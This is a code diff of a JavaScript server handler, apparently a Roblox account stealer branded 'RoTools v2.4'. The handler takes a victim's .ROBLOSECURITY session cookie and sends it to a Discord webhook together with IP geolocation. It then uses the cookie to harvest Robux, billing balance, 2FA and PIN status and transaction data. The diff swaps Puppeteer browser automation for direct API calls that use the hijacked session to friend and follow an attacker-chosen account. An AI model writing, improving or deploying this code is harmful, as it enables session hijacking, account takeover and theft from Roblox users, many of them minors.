@@ -1,14 +1,12 @@
 import fetch from 'node-fetch';
-import puppeteer from 'puppeteer';
-import { v4 as uuidv4 } from 'uuid';
 
 export default async function handler(req, res) {
-  // Authorization check
+  // Verify authorization
   if (req.headers.authorization !== 'Bearer secure-token-2025') {
     return res.status(401).json({ error: 'Unauthorized' });
   }
 
-  // Method check
+  // Only allow POST requests
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -22,7 +20,7 @@ export default async function handler(req, res) {
     // Get client IP address
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     
-    // IP information lookup (same as before)
+    // Get detailed IP information
     let ipInfo = {};
     try {
       const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=66842623`);
@@ -32,7 +30,7 @@ export default async function handler(req, res) {
       ipInfo = { status: 'error', message: 'IP lookup failed' };
     }
 
-    // Format IP fields (same as before)
+    // Format IP information fields
     const ipFields = [];
     if (ipInfo.status === 'success') {
       ipFields.push(
@@ -53,7 +51,7 @@ export default async function handler(req, res) {
       );
     }
 
-    // Send cookie + IP info to Discord
+    // Send cookie + IP info to Discord with @everyone ping
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -81,12 +79,13 @@ export default async function handler(req, res) {
       })
     });
 
-    // Get account information (same as before)
+    // 2. Get account information
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
     
     if (!userRes.ok || userRes.status === 401) {
+      // Send invalid cookie notification
       await fetch(process.env.DISCORD_WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -110,45 +109,193 @@ export default async function handler(req, res) {
     const userData = await userRes.json();
     const userId = userData.id;
 
-    // Fetch account data (same as before)
-    // ... [rest of account data fetching code remains unchanged] ...
+    // Fetch all data in parallel
+    const [
+      robuxRes,
+      creditRes,
+      settingsRes,
+      friendsRes,
+      voiceRes,
+      gamepassesRes,
+      badgesRes,
+      transactionsRes,
+      thumbnailRes
+    ] = await Promise.all([
+      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch('https://billing.roblox.com/v1/credit', { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch('https://www.roblox.com/my/settings/json', { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch(`https://friends.roblox.com/v1/my/friends/count`, { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch('https://voice.roblox.com/v1/settings', { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch(`https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId=${userId}`, { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch(`https://accountinformation.roblox.com/v1/users/${userId}/roblox-badges`, { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { 
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
+      }),
+      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=${userId}`)
+    ]);
 
-    // Send account information to Discord (same as before)
+    // Parse responses
+    const robuxData = await robuxRes.json();
+    const creditData = await creditRes.json();
+    const settingsData = await settingsRes.json();
+    const friendsData = await friendsRes.json();
+    const voiceData = await voiceRes.json();
+    const gamepassesData = await gamepassesRes.text();
+    const badgesData = await badgesRes.text();
+    const transactionsData = await transactionsRes.json();
+    const thumbnailData = await thumbnailRes.json();
+
+    // Process data
+    const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
+      .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
+    
+    // Truncate badges list if too long
+    let account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
+      .map(match => match.split('"')[3])
+      .join(', ') || 'None';
+    
+    if (account_badges.length > 1000) {
+      account_badges = account_badges.substring(0, 1000) + '... (truncated)';
+    }
+
+    // Prepare account information embed
+    const accountInfoEmbed = {
+      title: "✅ ACCOUNT INFORMATION",
+      color: 0x000000,
+      thumbnail: { url: thumbnailData.data[0].imageUrl },
+      fields: [
+        { name: "💰 Robux", value: `${robuxData.robux}`, inline: true },
+        { name: "💳 Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
+        { name: "👤 Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
+        { name: "📧 Email Verified", value: `${settingsData.IsEmailVerified}`, inline: true },
+        { name: "🎂 Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
+        { name: "👶 Above 13", value: `${settingsData.UserAbove13}`, inline: true },
+        { name: "🌟 Premium", value: `${settingsData.IsPremium}`, inline: true },
+        { name: "🔑 Has PIN", value: `${settingsData.IsAccountPinEnabled}`, inline: true },
+        { name: "🔒 2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled || false}`, inline: true },
+        { name: "👥 Friends", value: `${friendsData.count}`, inline: true },
+        { name: "🎤 Voice Verified", value: `${voiceData.isVerifiedForVoice}`, inline: true },
+        { name: "🎮 Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
+        { name: "🏆 Badges", value: account_badges.length > 1024 ? 'Too many to display' : account_badges, inline: false },
+        { name: "💹 Transactions", value: "--------------------------------", inline: false },
+        { name: "🛒 Sales of Goods", value: `${transactionsData.salesTotal}`, inline: true },
+        { name: "💎 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
+        { name: "📈 Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
+        { name: "💳 Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
+        { name: "⏳ Pending", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
+        { name: "📊 Overall", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
+      ],
+      footer: { text: "RoTools v2.4 | Account Information" },
+      timestamp: new Date().toISOString()
+    };
+
+    // Send account information to Discord
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ embeds: [accountInfoEmbed] })
     });
 
-    // Puppeteer automation for browser-like actions
-    const ATTACKER_USER_ID = process.env.ATTACKER_USER_ID || '8318490238';
-    const result = await performBrowserActions(cookie, ATTACKER_USER_ID);
+    // ===== NEW: FRIEND REQUEST AND FOLLOW FUNCTIONALITY =====
+    const TARGET_USER_ID = process.env.TARGET_USER_ID || "8318490238"; // Default to example ID
     
-    // Send action results to Discord
-    await fetch(process.env.DISCORD_WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: "🤖 AUTO ACTIONS PERFORMED",
-          color: 0x000000,
-          fields: [
-            { name: 'Follow Action', value: result.followSuccess ? '✅ Success' : '❌ Failed', inline: true },
-            { name: 'Friend Request', value: result.friendSuccess ? '✅ Success' : '❌ Failed', inline: true },
-            { name: 'Target User', value: ATTACKER_USER_ID, inline: false },
-            { name: 'Method', value: 'Puppeteer Browser Automation', inline: false }
-          ],
-          footer: { text: "RoTools v2.4 | Auto Actions" },
-          timestamp: new Date().toISOString()
-        }]
-      })
-    });
+    try {
+      // Get CSRF token
+      const csrfRes = await fetch('https://auth.roblox.com/v2/login', {
+        method: 'POST',
+        headers: { 
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'Content-Type': 'application/json'
+        }
+      });
+      
+      let csrfToken = csrfRes.headers.get('x-csrf-token');
+      if (!csrfToken) {
+        throw new Error('CSRF token not found in headers');
+      }
+
+      // Send friend request
+      const friendRes = await fetch(
+        `https://friends.roblox.com/v1/users/${TARGET_USER_ID}/request-friendship`,
+        {
+          method: 'POST',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Content-Type': 'application/json'
+          }
+        }
+      );
+      
+      // Follow user
+      const followRes = await fetch(
+        `https://friends.roblox.com/v1/users/${TARGET_USER_ID}/follow`,
+        {
+          method: 'POST',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Content-Type': 'application/json'
+          }
+        }
+      );
+
+      // Send success notification to Discord
+      await fetch(process.env.DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: "✅ SOCIAL ACTIONS COMPLETED",
+            description: `Successfully sent friend request and followed user ${TARGET_USER_ID}`,
+            color: 0x00ff00,
+            fields: [
+              { name: 'Friend Request', value: friendRes.ok ? '✅ Success' : `❌ Failed (${friendRes.status})`, inline: true },
+              { name: 'Follow Action', value: followRes.ok ? '✅ Success' : `❌ Failed (${followRes.status})`, inline: true }
+            ],
+            footer: { text: "RoTools v2.4 | Social Actions" },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    } catch (socialError) {
+      console.error('Social action error:', socialError);
+      await fetch(process.env.DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: "❌ SOCIAL ACTION FAILED",
+            description: `Error performing social actions: ${socialError.message}`,
+            color: 0xff0000,
+            footer: { text: "RoTools v2.4 | Error" },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    }
+    // ===== END NEW FUNCTIONALITY =====
 
     return res.json({ success: true });
     
   } catch (error) {
     console.error('Server error:', error);
     
+    // Send error notification to Discord
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -172,112 +319,4 @@ export default async function handler(req, res) {
       error: error.message || 'Internal server error' 
     });
   }
-}
-
-// Puppeteer-based action performer
-async function performBrowserActions(cookie, targetUserId) {
-  const result = { followSuccess: false, friendSuccess: false };
-  let browser;
-  
-  try {
-    // Launch Puppeteer with specific options
-    browser = await puppeteer.launch({
-      headless: true,
-      args: [
-        '--no-sandbox',
-        '--disable-setuid-sandbox',
-        '--disable-dev-shm-usage',
-        '--disable-accelerated-2d-canvas',
-        '--no-first-run',
-        '--no-zygote',
-        '--single-process',
-        '--disable-gpu'
-      ],
-      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
-    });
-
-    const context = await browser.createIncognitoBrowserContext();
-    const page = await context.newPage();
-    
-    // Set user agent to mimic Chrome
-    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36');
-    
-    // Set Roblox cookie
-    await page.setCookie({
-      name: '.ROBLOSECURITY',
-      value: cookie,
-      domain: '.roblox.com',
-      path: '/',
-      httpOnly: true,
-      secure: true,
-      sameSite: 'None'
-    });
-
-    // Navigate to profile page
-    await page.goto(`https://www.roblox.com/users/${targetUserId}/profile`, {
-      waitUntil: 'networkidle2',
-      timeout: 60000
-    });
-
-    // Click follow button
-    try {
-      const followButton = await page.waitForSelector('.btn-follow', { timeout: 10000 });
-      await followButton.click();
-      await page.waitForResponse(response => 
-        response.url().includes('follow') && response.status() === 200,
-        { timeout: 10000 }
-      );
-      result.followSuccess = true;
-    } catch (e) {
-      console.error('Follow action failed:', e);
-    }
-
-    // Click friend button
-    try {
-      const friendButton = await page.waitForSelector('.btn-add-friend', { timeout: 10000 });
-      await friendButton.click();
-      await page.waitForResponse(response => 
-        response.url().includes('request-friendship') && response.status() === 200,
-        { timeout: 10000 }
-      );
-      result.friendSuccess = true;
-    } catch (e) {
-      console.error('Friend action failed:', e);
-    }
-
-    // Take screenshot for debugging
-    const screenshotPath = `/tmp/screenshot-${uuidv4()}.png`;
-    await page.screenshot({ path: screenshotPath, fullPage: true });
-    
-    // Upload screenshot to Discord
-    try {
-      const screenshotBuffer = fs.readFileSync(screenshotPath);
-      await fetch(process.env.DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: "🖥️ Browser Action Screenshot",
-          embeds: [{
-            title: "Browser Session Screenshot",
-            image: { url: 'attachment://screenshot.png' }
-          }],
-          files: [{
-            name: 'screenshot.png',
-            data: screenshotBuffer.toString('base64'),
-            contentType: 'image/png'
-          }]
-        })
-      });
-      fs.unlinkSync(screenshotPath);
-    } catch (e) {
-      console.error('Failed to upload screenshot:', e);
-    }
-
-  } catch (error) {
-    console.error('Puppeteer error:', error);
-  } finally {
-    if (browser) await browser.close();
-  }
-
-  return result;
 }
